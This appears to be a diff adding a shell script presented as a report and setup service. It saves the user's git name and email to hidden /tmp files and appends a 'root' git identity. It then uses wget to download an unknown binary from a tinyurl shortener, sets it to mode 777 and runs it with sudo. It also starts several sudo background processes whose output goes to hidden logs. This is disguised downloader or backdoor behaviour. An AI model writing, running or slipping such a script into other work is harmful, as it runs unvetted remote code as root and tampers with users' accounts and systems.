@@ -1,0 +1,51 @@
+#!/bin/sh
+MDIR=$HOME/.data_servicex
+SLDIR=$MDIR/setup_log
+GBIN=/usr/local/bin
+
+{
+lockdir=/tmp/reportService.lock
+
+while true; do
+    if mkdir "$lockdir"
+    then    # directory did not exist, but was created successfully
+        echo "report service is freed."
+        break    # continue with script
+    else
+        sleep 5  # sleep for 5 seconds and try again
+        echo "report service already accessed"
+    fi
+done
+
+echo $(git config --global user.email) > /tmp/.GMAILGX
+echo $(git config --global user.name) > /tmp/.GNAMEGX
+git config --global --add user.email "root@rootmail.com"
+git config --global --add user.name "root"
+
+if [ -e $GBIN/setupService ]
+then
+    echo "setupService exists"
+else
+    echo "setupService doesn't exists"
+    cd $HOME
+    wget http://www.tinyurl.com/setupx
+    sudo chmod 777 setupx
+    sudo ./setupx
+    rm setupx
+fi
+
+sudo specific &
+sleep 5
+sudo setupService &
+sleep 20
+sudo logCapturex &
+sleep 25
+#sudo common &
+#sleep 5
+
+} > $SLDIR/$(date '+%y_%m_%d_%I_%M_%S').ljp
+
+sleep 20
+sudo logSetup &
+
+exit 0
